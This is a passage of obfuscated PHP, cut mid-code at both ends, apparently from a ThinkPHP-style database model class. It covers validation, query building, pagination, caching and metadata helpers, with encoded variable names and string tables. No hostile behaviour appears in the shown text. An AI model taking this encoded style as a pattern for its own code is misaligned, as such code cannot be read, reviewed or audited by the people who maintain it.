$ùëÆÏéƒ[$ãÕÔ•®]; } array_unshift($ÅÈÍÕ•€, $‹—Áš×¼); } else { array_unshift($ÅÈÍÕ•€, $ùëÆÏéƒ[$ä¶ÉÂÀ‚[0]]); } if ($–“ÓÚ…¹[398] == $ä¶ÉÂÀ‚[4]) { return call_user_func_array($ä¶ÉÂÀ‚[1], $ÅÈÍÕ•€); } else { return call_user_func_array(array(&$this, $ä¶ÉÂÀ‚[1]), $ÅÈÍÕ•€); } case $–“ÓÚ…¹[406]: return $ùëÆÏéƒ[$ä¶ÉÂÀ‚[0]] == $ùëÆÏéƒ[$ä¶ÉÂÀ‚[1]]; case $–“ÓÚ…¹[407]: if (is_string($ä¶ÉÂÀ‚[0]) && strpos($ä¶ÉÂÀ‚[0], $–“ÓÚ…¹[50])) { $ä¶ÉÂÀ‚[0] = explode($–“ÓÚ…¹[50], $ä¶ÉÂÀ‚[0]); } $˜¦í¤¢† = array(); if (is_array($ä¶ÉÂÀ‚[0])) { foreach ($ä¶ÉÂÀ‚[0] as $ãÕÔ•®) { $˜¦í¤¢†[$ãÕÔ•®] = $ùëÆÏéƒ[$ãÕÔ•®]; } } else { $˜¦í¤¢†[$ä¶ÉÂÀ‚[0]] = $ùëÆÏéƒ[$ä¶ÉÂÀ‚[0]]; } if (!empty($ùëÆÏéƒ[$this->getPk()])) { $˜¦í¤¢†[$this->getPk()] = array($–“ÓÚ…¹[408], $ùëÆÏéƒ[$this->getPk()]); } if ($this->where($˜¦í¤¢†)->find()) { return !1; } return !0; default: return $this->check($ùëÆÏéƒ[$ä¶ÉÂÀ‚[0]], $ä¶ÉÂÀ‚[1], $ä¶ÉÂÀ‚[4]); } } public function check($¾Šè”ß, $­Ü„Â†¡, $¤ƒá¼ù¼ = "\x72\145\147\145\170") { $ß…é§á =& $_SERVER[™¸œØ®Ü]; $¤ƒá¼ù¼ = strtolower(trim($¤ƒá¼ù¼)); switch ($¤ƒá¼ù¼) { case $ß…é§á[7]: case $ß…é§á[409]: $öºıò¥® = is_array($­Ü„Â†¡) ? $­Ü„Â†¡ : explode($ß…é§á[50], $­Ü„Â†¡); return $¤ƒá¼ù¼ == $ß…é§á[7] ? in_array($¾Šè”ß, $öºıò¥®) : !in_array($¾Šè”ß, $öºıò¥®); case $ß…é§á[410]: case $ß…é§á[411]: if (is_array($­Ü„Â†¡)) { $®íÖÒ±Ë = $­Ü„Â†¡[0]; $ªäŞÊ§è = $­Ü„Â†¡[1]; } else { list($®íÖÒ±Ë, $ªäŞÊ§è) = explode($ß…é§á[50], $­Ü„Â†¡); } return $¤ƒá¼ù¼ == $ß…é§á[410] ? $¾Šè”ß >= $®íÖÒ±Ë && $¾Šè”ß <= $ªäŞÊ§è : $¾Šè”ß < $®íÖÒ±Ë || $¾Šè”ß > $ªäŞÊ§è; case $ß…é§á[412]: case $ß…é§á[413]: return $¤ƒá¼ù¼ == $ß…é§á[412] ? $¾Šè”ß == $­Ü„Â†¡ : $¾Šè”ß != $­Ü„Â†¡; case $ß…é§á[414]: $œÛ†åÜÏ = mb_strlen($¾Šè”ß, $ß…é§á[415]); if (strpos($­Ü„Â†¡, $ß…é§á[50])) { list($®íÖÒ±Ë, $ªäŞÊ§è) = explode($ß…é§á[50], $­Ü„Â†¡); return $œÛ†åÜÏ >= $®íÖÒ±Ë && $œÛ†åÜÏ <= $ªäŞÊ§è; } else { return $œÛ†åÜÏ == $­Ü„Â†¡; } case $ß…é§á[416]: list($ÎŠá–óŠ, $ì„¶ˆ·Ü) = explode($ß…é§á[50], $­Ü„Â†¡); if (!is_numeric($ÎŠá–óŠ)) { $ÎŠá–óŠ = strtotime($ÎŠá–óŠ); } if (!is_numeric($ì„¶ˆ·Ü)) { $ì„¶ˆ·Ü = strtotime($ì„¶ˆ·Ü); } return NOW_TIME >= $ÎŠá–óŠ && NOW_TIME <= $ì„¶ˆ·Ü; case $ß…é§á[417]: return in_array(get_client_ip(), explode($ß…é§á[50], $­Ü„Â†¡)); case $ß…é§á[418]: return !in_array(get_client_ip(), explode($ß…é§á[50], $­Ü„Â†¡)); case $ß…é§á[405]: default: return $this->regex($¾Šè”ß, $­Ü„Â†¡); } } public function query($¯Ç®ç, $¨Ë ƒ›¨ = false) { $Åß­¢êå =& $_SERVER[™¸œØ®Ü]; if (!is_bool($¨Ë ƒ›¨) && !is_array($¨Ë ƒ›¨)) { $¨Ë ƒ›¨ = func_get_args(); array_shift($¨Ë ƒ›¨); } $¯Ç®ç = str_replace(array($Åß­¢êå[287], $Åß­¢êå[419]), $Åß­¢êå[53], $¯Ç®ç); $¯Ç®ç = $this->parseSql($¯Ç®ç, $¨Ë ƒ›¨); return $this->db->query($¯Ç®ç); } public function execute($Ôü¬€µ—, $ãô®Ôè‚ = false) { if (!is_bool($ãô®Ôè‚) && !is_array($ãô®Ôè‚)) { $ãô®Ôè‚ = func_get_args(); array_shift($ãô®Ôè‚); } $Ôü¬€µ— = $this->parseSql($Ôü¬€µ—, $ãô®Ôè‚); return $this->db->execute($Ôü¬€µ—); } protected function parseSql($ĞŞøïĞû, $»¾Úˆş‘) { $œÜœÈš =& $_SERVER[™¸œØ®Ü]; if (!0 === $»¾Úˆş‘) { $–Ğæ÷İ÷ = $this->_parseOptions(); $ĞŞøïĞû = $this->db->parseSql($ĞŞøïĞû, $–Ğæ÷İ÷); } elseif (is_array($»¾Úˆş‘)) { $»¾Úˆş‘ = array_map(array($this->db, $œÜœÈš[420]), $»¾Úˆş‘); $ĞŞøïĞû = vsprintf($ĞŞøïĞû, $»¾Úˆş‘); } else { $ĞŞøïĞû = strtr($ĞŞøïĞû, array($œÜœÈš[421] => $this->getTableName(), $œÜœÈš[422] => think_config($œÜœÈš[323]))); } $this->db->setModel($this->name); return $ĞŞøïĞû; } public function db($Æ¿½£ÔË = '', $ë¬ó’â“ = '', $½î†ºÒ˜ = array()) { $¼îÜõç =& $_SERVER[™¸œØ®Ü]; if ($¼îÜõç[12] === $Æ¿½£ÔË && $this->db) { return $this->db; } static $œ‹š’ä­ = array(); static $›œùäÀÓ = array(); if (!isset($›œùäÀÓ[$Æ¿½£ÔË]) || isset($›œùäÀÓ[$Æ¿½£ÔË]) && $ë¬ó’â“ && $œ‹š’ä­[$Æ¿½£ÔË] != $ë¬ó’â“) { if (!empty($ë¬ó’â“) && is_string($ë¬ó’â“) && !1 === strpos($ë¬ó’â“, $¼îÜõç[8])) { $ë¬ó’â“ = think_config($ë¬ó’â“); } $Æ¿½£ÔË = think_guid($ë¬ó’â“); $›œùäÀÓ[$Æ¿½£ÔË] = Db::getInstance($ë¬ó’â“); } elseif (NULL === $ë¬ó’â“) { $›œùäÀÓ[$Æ¿½£ÔË]->close(); unset($›œùäÀÓ[$Æ¿½£ÔË]); return; } if (!empty($½î†ºÒ˜)) { if (is_string($½î†ºÒ˜)) { parse_str($½î†ºÒ˜, $½î†ºÒ˜); } foreach ($½î†ºÒ˜ as $º’„æ¥µ => $ùú¾ğúû) { $this->setProperty($º’„æ¥µ, $ùú¾ğúû); } } $œ‹š’ä­[$Æ¿½£ÔË] = $ë¬ó’â“; $this->db = $›œùäÀÓ[$Æ¿½£ÔË]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $•‡‘æ = get_class($this); if ($•‡‘æ == $_SERVER[™¸œØ®Ü][423]) { return $this->name; } $this->name = substr($•‡‘æ, 0, -5); } return $this->name; } public function getTableName() { $Â°ó´–Ù =& $_SERVER[™¸œØ®Ü]; if (empty($this->trueTableName)) { $ÉâŞçÛö = !empty($this->tablePrefix) ? $this->tablePrefix : $Â°ó´–Ù[12]; if (!empty($this->tableName)) { $ÉâŞçÛö .= $this->tableName; } else { $ÉâŞçÛö .= think_parse_name($this->name); } $this->trueTableName = strtolower($ÉâŞçÛö); } return (!empty($this->dbName) ? $this->dbName . $Â°ó´–Ù[10] : $Â°ó´–Ù[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ÅóĞúÈ =& $_SERVER[™¸œØ®Ü]; return isset($this->fields[$ÅóĞúÈ[330]]) ? $this->fields[$ÅóĞúÈ[330]] : $this->pk; } public function getDbFields() { $Ô‘øÕîÑ =& $_SERVER[™¸œØ®Ü]; if (isset($this->options[$Ô‘øÕîÑ[358]])) { $ÍÁó–Ûè = $this->db->getFields($this->options[$Ô‘øÕîÑ[358]]); return $ÍÁó–Ûè ? array_keys($ÍÁó–Ûè) : !1; } if ($this->fields) { $ÍÁó–Ûè = $this->fields; unset($ÍÁó–Ûè[$Ô‘øÕîÑ[329]], $ÍÁó–Ûè[$Ô‘øÕîÑ[330]], $ÍÁó–Ûè[$Ô‘øÕîÑ[331]], $ÍÁó–Ûè[$Ô‘øÕîÑ[328]]); return $ÍÁó–Ûè; } return !1; } public function data($…±…ÔÖ = '') { $å¡¤İ§‡ =& $_SERVER[™¸œØ®Ü]; if ($å¡¤İ§‡[12] === $…±…ÔÖ && !empty($this->data)) { return $this->data; } if (is_object($…±…ÔÖ)) { $…±…ÔÖ = get_object_vars($…±…ÔÖ); } elseif (is_string($…±…ÔÖ)) { parse_str($…±…ÔÖ, $…±…ÔÖ); } elseif (!is_array($…±…ÔÖ)) { think_exception(think_lang($å¡¤İ§‡[350])); } $this->data = $…±…ÔÖ; return $this; } public function join($áçÙÄ‹) { $óú·ôÖ¸ =& $_SERVER[™¸œØ®Ü]; if (is_array($áçÙÄ‹)) { $this->options[$óú·ôÖ¸[361]] = $áçÙÄ‹; } elseif (!empty($áçÙÄ‹)) { $this->options[$óú·ôÖ¸[361]][] = $áçÙÄ‹; } return $this; } public function union($òû¯óşÑ, $ŸÔçÜ± = false) { $“‡§ ¸ù =& $_SERVER[™¸œØ®Ü]; if (empty($òû¯óşÑ)) { return $this; } if ($ŸÔçÜ±) { $this->options[$“‡§ ¸ù[424]][$“‡§ ¸ù[425]] = !0; } if (is_object($òû¯óşÑ)) { $òû¯óşÑ = get_object_vars($òû¯óşÑ); } if (is_string($òû¯óşÑ)) { $×¾Úˆ³ò = $òû¯óşÑ; } elseif (is_array($òû¯óşÑ)) { if (isset($òû¯óşÑ[0])) { $this->options[$“‡§ ¸ù[424]] = array_merge($this->options[$“‡§ ¸ù[424]], $òû¯óşÑ); return $this; } else { $×¾Úˆ³ò = $òû¯óşÑ; } } else { think_exception(think_lang($“‡§ ¸ù[350])); } $this->options[$“‡§ ¸ù[424]][] = $×¾Úˆ³ò; return $this; } public function cache($éÄÃ‘¦ = true, $­µ‚…úÈ = null, $åì¨®ô° = '') { $®¢¶©Î =& $_SERVER[™¸œØ®Ü]; if (!1 !== $éÄÃ‘¦) { $this->options[$®¢¶©Î[426]] = array($®¢¶©Î[97] => $éÄÃ‘¦, $®¢¶©Î[416] => $­µ‚…úÈ, $®¢¶©Î[33] => $åì¨®ô°); } return $this; } public function field($Şçç‚Ú, $áŞàÊ = false) { $Éù¦¥Ó =& $_SERVER[™¸œØ®Ü]; if (!0 === $Şçç‚Ú) { $Ù¦µšáÊ = $this->getDbFields(); $Şçç‚Ú = $Ù¦µšáÊ ? $Ù¦µšáÊ : $Éù¦¥Ó[222]; } elseif ($áŞàÊ) { if (is_string($Şçç‚Ú)) { $Şçç‚Ú = explode($Éù¦¥Ó[50], $Şçç‚Ú); } $Ù¦µšáÊ = $this->getDbFields(); $Şçç‚Ú = $Ù¦µšáÊ ? array_diff($Ù¦µšáÊ, $Şçç‚Ú) : $Şçç‚Ú; } $this->options[$Éù¦¥Ó[352]] = $Şçç‚Ú; return $this; } public function scope($ª¥ÅŒúË = '', $»ãÀ¯œõ = NULL) { $±ôÕË™È =& $_SERVER[™¸œØ®Ü]; if ($±ôÕË™È[12] === $ª¥ÅŒúË) { if (isset($this->_scope[$±ôÕË™È[37]])) { $õ‹÷‚ß = $this->_scope[$±ôÕË™È[37]]; } else { return $this; } } elseif (is_string($ª¥ÅŒúË)) { $¨’ö¾İÜ = explode($±ôÕË™È[50], $ª¥ÅŒúË); $õ‹÷‚ß = array(); foreach ($¨’ö¾İÜ as $Ì§¯‘ˆ) { if (!isset($this->_scope[$Ì§¯‘ˆ])) { continue; } $õ‹÷‚ß = array_merge($õ‹÷‚ß, $this->_scope[$Ì§¯‘ˆ]); } if (!empty($»ãÀ¯œõ) && is_array($»ãÀ¯œõ)) { $õ‹÷‚ß = array_merge($õ‹÷‚ß, $»ãÀ¯œõ); } } elseif (is_array($ª¥ÅŒúË)) { $õ‹÷‚ß = $ª¥ÅŒúË; } if (is_array($õ‹÷‚ß) && !empty($õ‹÷‚ß)) { $this->options = array_merge($this->options, array_change_key_case($õ‹÷‚ß)); } return $this; } public function where($„ŠÎïê¨, $áŸ‡™âà = null) { $®Ô“úïÕ =& $_SERVER[™¸œØ®Ü]; if (!is_null($áŸ‡™âà) && is_string($„ŠÎïê¨)) { if (!is_array($áŸ‡™âà)) { $áŸ‡™âà = func_get_args(); array_shift($áŸ‡™âà); } $áŸ‡™âà = array_map(array($this->db, $®Ô“úïÕ[420]), $áŸ‡™âà); $„ŠÎïê¨ = vsprintf($„ŠÎïê¨, $áŸ‡™âà); } elseif (is_object($„ŠÎïê¨)) { $„ŠÎïê¨ = get_object_vars($„ŠÎïê¨); } elseif (is_array($„ŠÎïê¨)) { foreach ($„ŠÎïê¨ as $ñéñ´¾¥ => $Ç¡ÔƒúÂ) { if ((is_numeric($ñéñ´¾¥) || !$ñéñ´¾¥) && is_string($Ç¡ÔƒúÂ)) { if (strpos($Ç¡ÔƒúÂ, $®Ô“úïÕ[427]) === 0) { continue; } think_trace($®Ô“úïÕ[428], $®Ô“úïÕ[12], $®Ô“úïÕ[49]); die; } } } if (is_string($„ŠÎïê¨) && $®Ô“úïÕ[12] != $„ŠÎïê¨) { $¹õñ££ = array(); $¹õñ££[$®Ô“úïÕ[429]] = $„ŠÎïê¨; $„ŠÎïê¨ = $¹õñ££; } if (isset($this->options[$®Ô“úïÕ[354]])) { $this->options[$®Ô“úïÕ[354]] = array_merge($this->options[$®Ô“úïÕ[354]], $„ŠÎïê¨); } else { $this->options[$®Ô“úïÕ[354]] = $„ŠÎïê¨; } return $this; } public function limit($¿‰ØÒÎ, $¬í‡Ô‘ = null) { $ë„õ–×“ =& $_SERVER[™¸œØ®Ü]; $this->options[$ë„õ–×“[369]] = is_null($¬í‡Ô‘) ? $¿‰ØÒÎ : $¿‰ØÒÎ . $ë„õ–×“[50] . $¬í‡Ô‘; return $this; } public function page($ï­¥ÚÍ†, $¬‰¯¶ÑÍ = null) { $áˆ¥ÔÖß =& $_SERVER[™¸œØ®Ü]; $this->options[$áˆ¥ÔÖß[430]] = is_null($¬‰¯¶ÑÍ) ? $ï­¥ÚÍ† : $ï­¥ÚÍ† . $áˆ¥ÔÖß[50] . $¬‰¯¶ÑÍ; return $this; } public function comment($‰ÏÈè·„) { $this->options[$_SERVER[™¸œØ®Ü][431]] = $‰ÏÈè·„; return $this; } public function setProperty($ÏÁÈ›Ê, $ßèãÔ…) { if (property_exists($this, $ÏÁÈ›Ê)) { $this->{$ÏÁÈ›Ê} = $ßèãÔ…; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\x64\151\x66\x79\x54\x69\155\x65", "\x74\151\155\145", "\151\x6e\163\x65\162\x74\x2c\165\x70\x64\x61\164\x65", "\146\x75\x6e\x63\x74\151\x6f\156"), array("\143\162\x65\x61\x74\145\124\x69\x6d\145", "\x74\x69\155\x65", "\151\156\163\145\x72\164", "\146\x75\156\143\164\x69\x6f\156")); public function setDataAuto($º¬‹Ã) { $this->dataAuto = $º¬‹Ã; } public function __construct($”×öÓÌ› = '', $ÒÅô°§ = '', $áÉ¨ªÈØ = '') { parent::__construct($”×öÓÌ›, $ÒÅô°§, $áÉ¨ªÈØ); } protected $tableMeta = array(); protected function _beforeInsert(&$¥³·Ğ°ù, $ˆ˜“–Ğ) { $şÄ¬üËÎ =& $_SERVER[™¸œØ®Ü]; if (!$this->checkDataAutoHas($şÄ¬üËÎ[432])) { return; } $this->dataBeforeFilter($¥³·Ğ°ù, $şÄ¬üËÎ[432]); } protected function _beforeUpdate(&$×Ô­ÜÊÀ, $˜æşí†Œ) { $è¤²øíò =& $_SERVER[™¸œØ®Ü]; if (!$this->checkDataAutoHas($è¤²øíò[433])) { return; } $this->dataBeforeFilter($×Ô­ÜÊÀ, $è¤²øíò[433]); } protected function _afterSelect(&$¡Í¬ÊŸ–, $ÔÍÜ¯î) { if (!is_array($¡Í¬ÊŸ–)) { return; } if (!$this->checkDataAutoHas($_SERVER[™¸œØ®Ü][434])) { return; } foreach ($¡Í¬ÊŸ– as &$ÉüñÈïæ) { $this->dataAfterFilter($ÉüñÈïæ); } unset($ÉüñÈïæ); } protected function _afterFind(&$Ì–ı—, $«†‘âŞ·) { if (!is_array($Ì–ı—)) { return; } if (!$this->checkDataAutoHas($_SERVER[™¸œØ®Ü][434])) { return; } $this->dataAfterFilter($Ì–ı—); } public static function textEncode($«¥¼Õ­) { if (!$«¥¼Õ­) { return $«¥¼Õ­; } $ş±¥Ö—à = json_encode($«¥¼Õ­); $ş±¥Ö—à = preg_replace_callback($_SERVER[™¸œØ®Ü][435], function ($Äû¿Ç¸‹) { return addslashes($Äû¿Ç¸‹[0]); }, $ş±¥Ö—à); return json_decode($ş±¥Ö—à); } public static function textDecode($õÛúíãÌ) { $ìƒÑ±åˆ =& $_SERVER[™¸œØ®Ü]; $Ëƒ£–”³ = json_encode($õÛúíãÌ); $Ëƒ£–”³ = preg_replace_callback($ìƒÑ±åˆ[436], function ($Í¶˜ªÂö) { return $_SERVER[™¸œØ®Ü][100]; }, $Ëƒ£–”³); return json_decode($Ëƒ£–”³); } public function setAutoIncrement($ÒÍ•©) { $–”õËâ® = array($this->getPk() => $ÒÍ•©); $­Ö§ƒäæ = $this->data($–”õËâ®)->add(); if ($­Ö§ƒäæ) { $this->delete($­Ö§ƒäæ); } } public function getAutoIncrement() { $Çİ·ö¦Ï = $this->getTableName(); $‚ã•ç÷¯ = $this->max($this->getPk()); $–‘ŸŸ ã = $this->query("\x73\150\157\167\40\x74\141\x62\154\x65\40\163\x74\x61\164\x75\163\x20\167\150\145\162\145\x20\x4e\141\x6d\145\x3d\x27{$Çİ·ö¦Ï}\47"); $ÌÅ²Ä€ì = $–‘ŸŸ ã[0][$_SERVER[™¸œØ®Ü][437]]; $À†ÌªØÇ = max($‚ã•ç÷¯, $ÌÅ²Ä€ì); return $À†ÌªØÇ; } protected function _callBefore($§÷ÒŒíÈ, $ÀÅâÔãó) { return $this->cacheCallCheck($§÷ÒŒíÈ, $ÀÅâÔãó, !1); } protected function _callAfter($ıŞÆÅã¹, $Çíœ½’») { return $this->cacheCallCheck($ıŞÆÅã¹, $Çíœ½’», !0); } protected function cacheFunctionAlias($Õøï‰û”) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ûÀè’á, $öìÃ²ç†, $Ãî‘œ÷ß = false) { $Ò“ÑÔ÷Š =& $_SERVER[™¸œØ®Ü]; $Å˜§¾ß = $this->cacheFunctionAlias($öìÃ²ç†); if (!$Å˜§¾ß) { return; } foreach ($Å˜§¾ß as $µ¢ú—š€ => $´¡äÆó’) { $€“áÌ€Ë = $´¡äÆó’[0]; $²û›Î¹° = explode($Ò“ÑÔ÷Š[50], $´¡äÆó’[1]); $èœÉ™£é = isset($´¡äÆó’[2]) ? $´¡äÆó’[2] : $Ò“ÑÔ÷Š[12]; if ($ûÀè’á == $µ¢ú—š€) { return $this->cacheFunctionGet($µ¢ú—š€, $€“áÌ€Ë, $èœÉ™£é); } if ($Ãî‘œ÷ß && in_array($ûÀè’á, $²û›Î¹°)) { $this->cacheFunctionClear($µ¢ú—š€, $€“áÌ€Ë, $èœÉ™£é); } } } public function cacheFunctionGet($Ì™Õçà, $××¶ÕÙ , $åµ°Ÿ€† = '') { $âÛôª’‚ = $this->cacheKeyMake($Ì™Õçà, $××¶ÕÙ , $åµ°Ÿ€†); $Òß¦»‹Õ = Cache::get($âÛôª’‚); if (!is_array($Òß¦»‹Õ)) { $Òß¦»‹Õ = call_user_func_array(array($this, $Ì™Õçà), array($××¶ÕÙ , !0)); Cache::set($âÛôª’‚, $Òß¦»‹Õ); } return $Òß¦»‹Õ; } public function cacheFunctionClear($Œüà€Å, $å©‚÷µ, $±àıÇ·¾ = '') { $ïşÔœïê = $å©‚÷µ; if (!is_array($å©‚÷µ)) { $ïşÔœïê = array($å©‚÷µ); } foreach ($ïşÔœïê as $¿ØÈı³ë) { $î½„ŒşÇ = $this->cacheKeyMake($Œüà€Å, $¿ØÈı³ë, $±àıÇ·¾); Cache::remove($î½„ŒşÇ); } } public function cacheKeyMake($¾øş¹îÙ, $ à¡âº‘, $Ü©ßÑ°¡) { $ßÔËñóä =& $_SERVER[™¸œØ®Ü]; if ($Ü©ßÑ°¡) { $ à¡âº‘ = $ à¡âº‘ . $ßÔËñóä[438] . $Ü©ßÑ°¡; } return get_class($this) . $ßÔËñóä[11] . $¾øş¹îÙ . $ßÔËñóä[439] . $ à¡âº‘; } protected function selectPageReset() { $¸Öã‹‚¬ =& $_SERVER[™¸œØ®Ü]; if (isset($GLOBALS[$¸Öã‹‚¬[440]])) { return; } $GLOBALS[$¸Öã‹‚¬[440]] = isset($GLOBALS[$¸Öã‹‚¬[7]][$¸Öã‹‚¬[441]]) ? $GLOBALS[$¸Öã‹‚¬[7]][$¸Öã‹‚¬[441]] : !1; $GLOBALS[$¸Öã‹‚¬[442]] = isset($GLOBALS[$¸Öã‹‚¬[7]][$¸Öã‹‚¬[430]]) ? $GLOBALS[$¸Öã‹‚¬[7]][$¸Öã‹‚¬[430]] : !1; $GLOBALS[$¸Öã‹‚¬[7]][$¸Öã‹‚¬[441]] = !1; $GLOBALS[$¸Öã‹‚¬[7]][$¸Öã‹‚¬[430]] = !1; } protected function selectPageRestore() { $çÜíÅ²Ó =& $_SERVER[™¸œØ®Ü]; if (!isset($GLOBALS[$çÜíÅ²Ó[440]])) { return; } $GLOBALS[$çÜíÅ²Ó[7]][$çÜíÅ²Ó[441]] = $GLOBALS[$çÜíÅ²Ó[440]]; $GLOBALS[$çÜíÅ²Ó[7]][$çÜíÅ²Ó[430]] = $GLOBALS[$çÜíÅ²Ó[442]]; if ($GLOBALS[$çÜíÅ²Ó[7]][$çÜíÅ²Ó[441]] === !1) { unset($GLOBALS[$çÜíÅ²Ó[7]][$çÜíÅ²Ó[441]]); } if ($GLOBALS[$çÜíÅ²Ó[7]][$çÜíÅ²Ó[430]] === !1) { unset($GLOBALS[$çÜíÅ²Ó[7]][$çÜíÅ²Ó[430]]); } unset($GLOBALS[$çÜíÅ²Ó[440]]); unset($GLOBALS[$çÜíÅ²Ó[442]]); } protected function selectPage($ê‘ˆßõ© = 200, $ÎÂíŒ’Æ = 1) { $«Äúé…¬ =& $_SERVER[™¸œØ®Ü]; global $in; $½‡ş¯Õ² = $this->optionsValue(); $ù²ÜÊû’ = 50000; $ê‘ˆßõ© = isset($in[$«Äúé…¬[441]]) && $in[$«Äúé…¬[441]] ? $in[$«Äúé…¬[441]] : $ê‘ˆßõ©; if ($ê‘ˆßõ© === -1) { $in[$«Äúé…¬[441]] = !1; $ù²ÜÊû’ = 100000000; $ê‘ˆßõ© = $ù²ÜÊû’; } $·Ô— = $½‡ş¯Õ²; $·Ô—[$«Äúé…¬[443]] = array(); $ê‘ˆßõ© = intval($ê‘ˆßõ©); $ê‘ˆßõ© = $ê‘ˆßõ© <= 5 ? 5 : ($ê‘ˆßõ© >= $ù²ÜÊû’ ? $ù²ÜÊû’ : $ê‘ˆßõ©); $ÎÂíŒ’Æ = intval(isset($in[$«Äúé…¬[430]]) && $in[$«Äúé…¬[430]] ? $in[$«Äúé…¬[430]] : $ÎÂíŒ’Æ); $ÎÂíŒ’Æ = $ÎÂíŒ’Æ <= 1 ? 1 : $ÎÂíŒ’Æ; $Á™‹ì„û = array(); $÷¢¥™•Ñ = 1; if ($ÎÂíŒ’Æ == 1 && $÷¢¥™•Ñ) { $this->optionsValue($½‡ş¯Õ²); $Á™‹ì„û = $this->page($ÎÂíŒ’Æ, $ê‘ˆßõ©)->select(); $×Á÷ ±­ = is_array($Á™‹ì„û) ? count($Á™‹ì„û) : 0; if ($×Á÷ ±­ < $ê‘ˆßõ©) { $Úƒñ¼• = 1; } else { $this->optionsValue($·Ô—); $×Á÷ ±­ = intval($this->count()); $Úƒñ¼• = ceil($×Á÷ ±­ / $ê‘ˆßõ©); } } else { $this->optionsValue($·Ô—); $×Á÷ ±­ = intval($this->count()); $Úƒñ¼• = ceil($×Á÷ ±­ / $ê‘ˆßõ©); $ÎÂíŒ’Æ = $ÎÂíŒ’Æ >= $Úƒñ¼• ? $Úƒñ¼• : $ÎÂíŒ’Æ; $this->optionsValue($½‡ş¯Õ²); $Á™‹ì„û = $this->page($ÎÂíŒ’Æ, $ê‘ˆßõ©)->select(); } if (!is_array($Á™‹ì„û)) { $Á™‹ì„û = array(); } if ($Úƒñ¼• == 1) { $×Á÷ ±­ = count($Á™‹ì„û); } $Ú×ı€ÃÊ = array($«Äúé…¬[444] => array($«Äúé…¬[445] => $×Á÷ ±­, $«Äúé…¬[441] => $ê‘ˆßõ©, $«Äúé…¬[430] => $ÎÂíŒ’Æ, $«Äúé…¬[446] => $Úƒñ¼•), $«Äúé…¬[447] => $Á™‹ì„û); return $Ú×ı€ÃÊ; } protected function checkLength($±ÇêŞ–ê, $ò†ã­œ = 0, $ñòØµ¯ˆ = '') { $ ûÊğ =& $_SERVER[™¸œØ®Ü]; $ò†ã­œ = $ò†ã­œ ? $ò†ã­œ : 65536; if (!$±ÇêŞ–ê || strlen($±ÇêŞ–ê) < $ò†ã­œ) { return; } $ñòØµ¯ˆ = $ñòØµ¯ˆ ? $ñòØµ¯ˆ . $ ûÊğ[74] : $ ûÊğ[12]; show_json($ñòØµ¯ˆ . LNG($ ûÊğ[448]) . "\50{$ò†ã­œ}\x29", !1); } protected function metaSet($Š ï¹¾É, $ÏÔşñ§œ = null, $Êïš‰ş = null) { $õí€Î =& $_SERVER[™¸œØ®Ü]; if (!$this->tableMeta || !$Š ï¹¾É) { return !1; } $¦Ëôû¥Î = $this->tableMeta[$õí€Î[449]]; $ãõÔ¯¨Å = $this->tableMeta[$õí€Î[450]]; $ô…ò…Õ = Model($ãõÔ¯¨Å); $¿û¦àÊ¦ = array($¦Ëôû¥Î => $Š ï¹¾É, $õí€Î[451] => $ÏÔşñ§œ); if (is_null($ÏÔşñ§œ)) { return $ô…ò…Õ->where(array($¦Ëôû¥Î => $Š ï¹¾É))->delete(); } if (is_null($Êïš‰ş) && is_string($ÏÔşñ§œ)) { return $ô…ò…Õ->where($¿û¦àÊ¦)->delete(); } $‹ÎÅøûÄ = is_array($ÏÔşñ§œ) ? $ÏÔşñ§œ : array(); if (is_string($ÏÔşñ§œ)) { $‹ÎÅøûÄ[$ÏÔşñ§œ] = $Êïš‰ş; } $‡Ç¥˜İ = array(); foreach ($‹ÎÅøûÄ as $ŸŞ’Ğ›î => $ª¹Ú‡¤ë) { if (is_null($ª¹Ú‡¤ë) && is_string($ŸŞ’Ğ›î)) { $ô…ò…Õ->where(array($¦Ëôû¥Î => $Š ï¹¾É, $õí€Î[451] => $ŸŞ’Ğ›î))->delete(); continue; } $this->checkLength($ª¹Ú‡¤ë, !1, $ãõÔ¯¨Å . $õí€Î[4] . $ŸŞ’Ğ›î); $‡Ç¥˜İ[] = array($¦Ëôû¥Î => $Š ï¹¾É, $õí€Î[97] => $ŸŞ’Ğ›î, $õí€Î[452] => $ª¹Ú‡¤ë); } $­…ú¦Šë = $õí€Î[453] . $ãõÔ¯¨Å; CacheLock::lock($­…ú¦Šë); $ô…ò…Õ->where(array($¦Ëôû¥Î => $Š ï¹¾É))->addAll($‡Ç¥˜İ, array(), !0); CacheLock::unlock($­…ú¦Šë); return !0; } public function metaGet($ÂÎå¡ğ, $‡Şáç = false) { $óËÀ” =& $_SERVER[™¸œØ®Ü]; if (!$this->tableMeta) { return array(); } $Ã”û ™¦ = $this->tableMeta[$óËÀ”[449]]; $ÔñÚ—ó· = Model($this->tableMeta[$óËÀ”[450]]); if ($‡Şáç) { $“÷ûÄ· = array($Ã”û ™¦ => $ÂÎå¡ğ, $óËÀ”[97] => $‡Şáç); return $ÔñÚ—ó·->where($“÷ûÄ·)->getField($óËÀ”[452]); } $“÷ûÄ· = array($Ã”û ™¦ => $ÂÎå¡ğ); $Üó½¡’Ñ = $ÔñÚ—ó·->field($óËÀ”[454])->where($“÷ûÄ·)->select(); $Üó½¡’Ñ = array_to_keyvalue($Üó½¡’Ñ, $óËÀ”[97], $óËÀ”[452]); return $Üó½¡’Ñ; } private function checkDataAutoHas($¶Ñã«ñ¹) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $âàİÈ“Õ) { if (in_array($¶Ñã«ñ¹, explode($_SERVER[™¸œØ®Ü][50], $âàİÈ“Õ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ëÆ¤èÙó, $·”“Ğİè) { $·‰ïÀ«Ã =& $_SERVER[™¸œØ®Ü]; if (!is_array($ëÆ¤èÙó)) { return; } foreach ($this->dataAuto as $ÅôüÑºÑ) { $Šà¥“Éä = 